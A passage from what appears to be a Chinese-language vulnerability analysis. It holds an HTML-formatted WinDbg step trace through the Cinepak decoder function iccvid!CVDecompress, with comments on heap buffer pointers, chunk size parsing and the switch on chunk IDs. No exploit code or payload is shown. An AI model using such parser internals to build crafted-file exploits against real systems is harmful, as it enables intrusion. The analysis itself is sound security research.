class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722da <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x12c</span>:</span><br><span class="line">73b722da 0345fc          <span class="keyword">add</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00000000</span> <span class="comment">; eax = 0x001535f8(堆缓冲区数据区域首地址),[ebp-4] = 0x0(堆缓冲区指针偏移)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722dd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x12f</span>:</span><br><span class="line">73b722dd 8d4e0c          <span class="keyword">lea</span>     <span class="built_in">ecx</span>,[<span class="built_in">esi</span>+<span class="number">0Ch</span>]                                  <span class="comment">; ecx = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722e0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x132</span>:</span><br><span class="line">73b722e0 <span class="number">894338</span>          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">38h</span>],<span class="built_in">eax</span> <span class="built_in">ds</span>:<span class="number">0023</span>:001535e8=<span class="number">00000000</span> <span class="comment">; eax = 0x001535f8,堆缓冲区数据区域首地址</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722e3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x135</span>:</span><br><span class="line">73b722e3 8b4520          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd50=<span class="number">00000540</span> <span class="comment">; eax = a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722e6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x138</span>:</span><br><span class="line">73b722e6 894de8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba6902 <span class="comment">; [ebp-18h] = ecx = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722e9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13b</span>:</span><br><span class="line">73b722e9 89433c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">3Ch</span>],<span class="built_in">eax</span> <span class="built_in">ds</span>:<span class="number">0023</span>:001535ec=<span class="number">00000000</span> <span class="comment">; eax = a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722ec <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13e</span>:</span><br><span class="line">73b722ec e9be000000      <span class="keyword">jmp</span>     iccvid!CVDecompress+<span class="number">0x201</span> (73b723af)</span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723af <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x201</span>:</span><br><span class="line">73b723af 837d0804        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="number">4</span>  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; 判断Size of strip data减去Strip Header大小后的数据大小是否大于等于4</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b723b3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x205</span>:</span><br><span class="line">73b723b3 0f8338ffffff    <span class="keyword">jae</span>     iccvid!CVDecompress+<span class="number">0x143</span> (73b722f1)    [br=<span class="number">1</span>] <span class="comment">; 大于等于则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722f1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x143</span>:</span><br><span class="line">73b722f1 0fb64103        <span class="keyword">movzx</span>   <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6911=<span class="number">00</span> <span class="comment">; ecx = 0x00ba690e,指向第1个CVID Chunk ID,eax = 0x00,Size of chunk data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722f5 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x147</span>:</span><br><span class="line">73b722f5 33d2            <span class="keyword">xor</span>     <span class="built_in">edx</span>,<span class="built_in">edx</span>                                        <span class="comment">; edx = edx^edx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722f7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x149</span>:</span><br><span class="line">73b722f7 8a7101          <span class="keyword">mov</span>     <span class="number">dh</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba690f=<span class="number">00</span> <span class="comment">; dh = 0x00,第1个CVID Chunk ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722fa <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x14c</span>:</span><br><span class="line">73b722fa 8a5102          <span class="keyword">mov</span>     <span class="built_in">dl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6910=<span class="number">00</span> <span class="comment">; dl = 0x00,Size of chunk data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b722fd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x14f</span>:</span><br><span class="line">73b722fd c1e208          <span class="keyword">shl</span>     <span class="built_in">edx</span>,<span class="number">8</span>                                          <span class="comment">; edx = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72300 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x152</span>:</span><br><span class="line">73b72300 0bd0            <span class="keyword">or</span>      <span class="built_in">edx</span>,<span class="built_in">eax</span>                                        <span class="comment">; 以大端读取Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72302 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x154</span>:</span><br><span class="line">73b72302 <span class="number">395508</span>          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="built_in">edx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; 判断Size of strip data减去Strip Header大小后的数据大小是否小于Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72305 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x157</span>:</span><br><span class="line">73b72305 8955e0          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20h</span>],<span class="built_in">edx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd10=<span class="number">00000000</span> <span class="comment">; [ebp-20h] = edx = 0x00000000,Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72308 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x15a</span>:</span><br><span class="line">73b72308 0f82ab000000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x20b</span> (73b723b9)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b7230e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x160</span>:</span><br><span class="line">73b7230e 0fb601          <span class="keyword">movzx</span>   <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>]         <span class="built_in">ds</span>:<span class="number">0023</span>:00ba690e=<span class="number">20</span> <span class="comment">; eax = 0x00000020,第1个CVID Chunk ID的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000020</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72311 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x163</span>:</span><br><span class="line">73b72311 83c0e0          <span class="keyword">add</span>     <span class="built_in">eax</span>,<span class="number">0FFFFFFE0h</span>     <span class="comment">; switch cases,0x20+0xFFFFFFE0=0x0,0x32+0xFFFFFFE0=0x12</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72314 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000247</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x166</span>:</span><br><span class="line">73b72314 83f812          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">12h</span>                                        <span class="comment">; eax&gt;0x12,则第1个CVID Chunk ID的高位字节大于0x32</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72317 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x169</span>:</span><br><span class="line">73b72317 <span class="number">777d</span>            <span class="keyword">ja</span>      iccvid!CVDecompress+<span class="number">0x1e8</span> (73b72396)    [br=<span class="number">0</span>] <span class="comment">; 大于则跳转，default case，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72319 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x16b</span>:</span><br><span class="line">73b72319 0fb6801024b773  <span class="keyword">movzx</span>   <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> iccvid!CVDecompress+<span class="number">0x262</span> (73b72410)[<span class="built_in">eax</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:73b72410=<span class="number">00</span> <span class="comment">; indirect table for switch statement</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba690e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba690e</span><br><span class="line"><span class="built_in">eip</span>=73b72320 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz ac pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000297</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x172</span>:</span><br><span class="line">73b72320 ff2485f823b773  <span class="keyword">jmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> iccvid!CVDecompress+<span class="number">0x24a</span> 